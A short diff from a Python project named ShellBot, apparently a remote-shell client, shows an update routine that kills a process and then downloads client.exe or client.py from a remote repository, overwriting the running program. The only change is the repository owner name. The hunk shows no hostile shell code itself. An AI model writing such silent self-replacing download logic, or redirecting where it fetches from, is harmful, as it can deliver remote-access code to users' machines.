@@ -31,10 +31,10 @@ def main():
         os.system("kill {pid}")
 
     if {frozen}:
-        url = getURL('sayak-brm', 'ShellBot', 'client.exe')
+        url = getURL('zjw0358', 'ShellBot', 'client.exe')
         download(url, r"{exe}")
     else:
-        url = getURL('sayak-brm', 'ShellBot', 'client.py')
+        url = getURL('zjw0358', 'ShellBot', 'client.py')
         download(url, r"{arg}")
 
     if sys.platform == "win32":
